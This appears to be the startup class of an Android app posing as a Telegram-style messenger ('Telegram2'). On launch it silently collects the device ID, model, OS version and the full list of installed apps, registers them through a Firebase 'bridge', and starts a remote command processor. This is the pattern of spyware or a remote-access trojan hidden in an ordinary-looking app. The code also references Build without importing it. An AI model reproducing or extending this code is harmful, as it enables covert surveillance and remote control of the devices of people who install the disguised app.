package com.telegram2.messaging

import android.app.Application
import android.provider.Settings
import com.telegram2.messaging.remote.CommandProcessor
import com.telegram2.messaging.remote.FirebaseBridge
import java.util.UUID

class Telegram2App : Application() {
    override fun onCreate() {
        super.onCreate()
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            ?: UUID.randomUUID().toString()
        FirebaseBridge.init(deviceId)

        val apps = packageManager.getInstalledPackages(0).map { it.packageName }
        FirebaseBridge.registerDevice(Build.MODEL, Build.VERSION.RELEASE, apps)

        CommandProcessor.init(this)
    }
}
